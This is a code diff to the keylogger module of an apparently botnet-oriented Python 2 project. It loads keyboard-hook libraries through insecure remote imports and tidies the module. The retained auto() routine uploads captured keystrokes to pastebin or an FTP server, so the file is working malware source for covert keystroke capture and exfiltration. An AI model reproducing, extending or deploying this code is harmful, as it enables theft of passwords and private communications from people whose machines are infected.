@@ -14,14 +14,14 @@ import time
 import Queue
 import threading
 import cStringIO
-import httpimport
 import collections
 
-# byob
-
-import util
 
 # remote imports
+
+import httpimport
+
+httpimport.INSECURE = True
 
 with httpimport.remote_repo(['pyHook','pythoncom','pyxhook'], base_url='http://localhost:8000'):
     if os.name == 'nt':
@@ -29,18 +29,20 @@ with httpimport.remote_repo(['pyHook','pythoncom','pyxhook'], base_url='http://l
             try:
                 exec "import %s" in globals()
             except ImportError:
-                util.debug("Error: unable to import '%s'" % module
+                util.debug("Error: unable to import '%s'" % module)
     else:
         for module in ['pyxhook']:
             try:
                 exec "import %s" in globals()
             except ImportError:
-                util.debug("Error: unable to import '%s'" % module
+                util.debug("Error: unable to import '%s'" % module)
 
 
+# byob
 
-_debug  = True
-_abort  = False
+import util
+
+
 _buffer = cStringIO.StringIO()
 _window = None
 _size   = 1000
@@ -81,26 +83,13 @@ def auto(mode):
                 result  = util.pastebin(_buffer) if mode == 'pastebin' else _upload_ftp(_buffer, filetype='.txt')
                 results.put(result)
                 _buffer.reset()
-            elif _abort:
+            elif globals().get('_abort'):
                 break
             else:
                 time.sleep(5)
         except Exception as e:
             util.debug("{} error: {}".format(auto.func_name, str(e)))
             break
-
-
-def status(*args, **kwargs):
-    """
-    Check keylogger status
-    """
-    try:
-        mode    = 'running' if 'Keylogger' in _workers else 'stopped'
-        status  = util.status(float(m._workers['Keylogger'].name))
-        length  = _buffer.tell()
-        return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, status, length)
-    except Exception as e:
-        return '{} error: {}'.format(status.func_name, str(e))
 
 
 def run():
